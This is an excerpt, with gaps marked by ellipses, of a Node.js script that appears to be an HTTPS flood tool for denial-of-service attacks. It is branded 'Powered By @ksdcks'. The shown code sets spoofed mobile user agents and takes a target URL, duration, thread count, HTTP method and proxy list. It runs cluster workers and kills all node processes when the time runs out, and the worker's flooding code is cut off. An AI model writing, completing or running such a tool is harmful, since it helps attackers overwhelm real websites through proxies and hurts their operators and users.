...
UA = [
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_4 like Mac OS X) AppleWebKit/604.1.35 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 uni-app","Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/602.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 uni-app/",];
...
if (process.argv.length !== 7) {
  console.log(red + "[" + blue + 'Powered By @ksdcks' + red + "] - " + red + 'Invalid number of arguments. Usage: ./https target time thread method(GET/POST) proxy.txt' + defcol);
  process.exit();
}
...
if (cluster.isMaster) {
    ...
    setTimeout(() => {
      console.log('\033[2J');
      console.log(red + "[" + blue + 'HTTPS - [TLSV2]' + red + "] - "+  red + 'End of process copyright @ksdcks'+ defcol);
      exec('pkill node -f');
    }, time * 1000);
}else {
  function ra() {
